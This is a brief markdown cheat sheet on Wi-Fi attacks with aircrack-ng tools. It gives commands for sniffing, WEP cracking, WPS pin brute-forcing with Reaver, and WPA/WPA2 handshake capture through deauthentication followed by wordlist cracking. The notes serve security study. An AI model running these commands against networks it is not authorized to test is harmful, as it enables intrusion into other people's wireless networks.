# airodump-ng (Packet Sniffing)

* Part of the _aircrack-ng_ suit.
* Packet Sniffer.

```
airodump-ng <monitor_interface>
```

## Sniff specific band

```
airodump-ng --band a <monitor_if>  // 5Ghz
airodump-ng --band abg <monitor_if> // 2.4Ghz & 5Ghz
```

## Targeted Packet Sniffing

The following command will create a `.cap` file that can later be analyzed with Wireshark.

```
airodump-ng --bssid <MAC> --channel <client_CH> --write test <monitor_if>
```

You will see a section listing `STATION`, which are the clients/devices connected to the BSSID's network

## Cracking WEP

1. Capture large number of packets/IVs (_airodump-ng_)
2. Analyse captured IVs and crack key (_aircrack-ng_)

```
// while sniffing network
// can use Fake Authentication & ARP Replay attack to generate new packets
aircrack-ng <CAP_FILE>
```

## Cracking WPS (WPA/WPA2)

We'll use _Reaver_ to bruteforce WPS pin.

```
wash --interface <MONITOR_INTERFACE>

aireplay-ng --fakeauth 30 -a <TARGET_MAC> -h <MONITOR_IF_MAC> <MONITOR_IF_NAME>

reaver --bssid <TARGET_NETWORK_MAC> --channel <AP_CHANNEL> --interface <MONITOR_IF_NAME> -vvv --no-associate
```

## Cracking WPA/WPA2

We need _handshake packets_.

* The handshake does not contain data that helps recover the key.
* The handshake contains data that can be used to check if a key is valid or not.

```
airodump-ng --bssid <TARGET_MAC> --channel <TARGET_CHANNEL> --write <FILE_NAME> <MONITOR_IF_NAME>
```

We can use _Deauthentication Attack_ to trigger re-connection and handshake packets.

Once we get a handshake packet we can do a __wordlist attack__.

Create a wordlist with a tool such as _crunch_.

```
aircrack-ng <CAP_FILE> -w <WORDLIST_FILE>
```
